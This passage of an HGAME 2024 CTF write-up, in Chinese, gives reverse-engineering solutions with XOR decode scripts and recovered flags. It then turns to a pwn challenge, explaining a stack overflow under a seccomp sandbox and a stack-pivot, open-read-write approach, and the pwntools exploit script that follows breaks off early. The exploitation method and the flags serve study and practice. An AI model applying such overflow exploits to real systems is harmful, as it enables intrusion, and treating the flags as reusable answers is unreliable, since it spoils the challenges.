punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token number\">48</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token number\">114</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token number\">100</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token number\">55</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token number\">94</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token number\">51</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token number\">91</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token number\">48</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token number\">108</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token number\">119</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token number\">97</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token number\">115</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token number\">49</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token number\">48</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token number\">108</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token number\">100</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token number\">124</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token number\">2</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token number\">3</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    a <span class=\"token operator\">=</span> flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> c<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote Python\\_R3vers3\\_1s\\_1nter3st1ng!\\=\"\">\n<p>VIDAR\\</p>\n</blockquote>\n<h3 id=\"ezupx100pt\"><a class=\"markdownIt-Anchor\" href=\"#ezupx100pt\">#</a> ezUPX(100pt)</h3>\n<blockquote>\n<p>UPX is a packer</p>\n</blockquote>\n<p>给定文件为加 upx 壳</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>upx <span class=\"token parameter variable\">-d</span> ezUPX.exe</pre></td></tr></table></figure><p>拖入 IDA 发现关键代码</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __fastcall <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// edx</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __int64 i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  __int128 v6<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-38h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+40h] [rbp-18h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>v6<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">sub_140001020</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"plz input your flag:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">sub_140001080</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%36s\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span>i64<span class=\"token punctuation\">;</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v6 <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> byte_1400022A0<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">++</span>v3 <span class=\"token operator\">>=</span> <span class=\"token number\">0x25</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token function\">sub_140001020</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Cooool!You really know a little of UPX!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">sub_140001020</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Sry,try again plz...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>byte_1400022A0[] == 647B76736049655D45136B02476D595C02456D066D5E0346465E016D02546D67626A134F320000000000000000000000</p>\n</blockquote>\n<p>同 ezASM 的 exp 相同，简单的异或</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>c1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x64</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7B</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x76</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x49</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5D</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6B</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x47</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x59</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5E</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5E</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x54</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6A</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4F</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x32</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>x1 <span class=\"token operator\">=</span> <span class=\"token number\">0x32</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    tmp <span class=\"token operator\">=</span> c1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> x1</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote Wow!Y0u\\_kn0w\\_4\\_l1ttl3\\_0f\\_UPX!\\=\"\">\n<p>VIDAR\\</p>\n</blockquote>\n<h3 id=\"ezida50pt\"><a class=\"markdownIt-Anchor\" href=\"#ezida50pt\">#</a> ezIDA(50pt)</h3>\n<blockquote>\n<p>Do you know how to use IDA?</p>\n</blockquote>\n<p>拖入 IDA 即可发现 flag</p>\n<pre><code class=\"language-assembly\">.text:00000001400010E0 main            proc near               ; CODE XREF: __scrt_common_main_seh(void)+107↓p\n.text:00000001400010E0                                         ; DATA XREF: .pdata:0000000140004018↓o\n.text:00000001400010E0                 push    rbx\n.text:00000001400010E2                 sub     rsp, 20h\n.text:00000001400010E6                 lea     rcx, Format     ; &quot;plz input flag:\\n&quot;\n.text:00000001400010ED                 call    sub_140001020\n.text:00000001400010F2                 lea     rbx, byte_1400030C8\n.text:00000001400010F9                 mov     rdx, rbx\n.text:00000001400010FC                 lea     rcx, a39s       ; &quot;%39s&quot;\n.text:0000000140001103                 call    sub_140001080\n.text:0000000140001108                 lea     r8, aHgameW3lc0meT0 ; &quot;hgame&#123;W3lc0me_T0_Th3_World_of_Rev3rse!&#125;&quot;\n.text:000000014000110F                 sub     r8, rbx\n......\n</code></pre>\n<blockquote W3lc0me\\_T0\\_Th3\\_World\\_of\\_Rev3rse!\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"ezsignin25pt\"><a class=\"markdownIt-Anchor\" href=\"#ezsignin25pt\">#</a> EzSignIn(25pt)</h3>\n<blockquote>\n<p>Have fun in pwn games of hgame2024~</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token number\">47.100</span>.137.175 <span class=\"token number\">31722</span></pre></td></tr></table></figure><blockquote I\\_HATE\\_PWN\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"elden-ring-i250pt\"><a class=\"markdownIt-Anchor\" href=\"#elden-ring-i250pt\">#</a> Elden Ring Ⅰ(250pt)</h3>\n<blockquote *******=\"\">\n<p>伊丽莎白学姐沉迷于艾尔登法环无法自拔，你能帮她从梅琳娜那里拿到 flag 吗？ flag 格式为 hgame</p>\n</blockquote>\n<p>栈迁移与 orw 结合</p>\n<p>程序代码</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __fastcall <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  __int64 v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">init</span><span class=\"token punctuation\">(</span>argc<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">seccomp_init</span><span class=\"token punctuation\">(</span><span class=\"token number\">2147418112LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v4<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">59LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v4<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">322LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">seccomp_load</span><span class=\"token punctuation\">(</span>v4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The fallen leaves tell a story...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token string\">\"And one other. Whom grace would again bless. A Tarnished of no renown. Cross the fog, to the Lands Between, to stand\"</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token string\">\" before the Elden Ring. And become the Elden Lord.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Good Bye.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token class-name\">ssize_t</span> <span class=\"token function\">vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-100h] BYREF</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Greetings. Traveller from beyond the fog. I Am Melina. I offer you an accord.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x130uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>vuln 有栈溢出漏洞能够溢出 0x30 的大小，也能够发现开启了沙箱。开始想这 ret2libc 可以一步到位，但是程序禁用了 execve，意味着 system 不能够使用（system 底层是由 execve 实现的）</p>\n<p>所以使用 orw 读取 flag。因为测试中发现 orw 去进栈之后，0x30 溢出字节不能够写入。所以使用栈迁移去解决即可。</p>\n<p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = remote('47.100.137.175',30139)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token 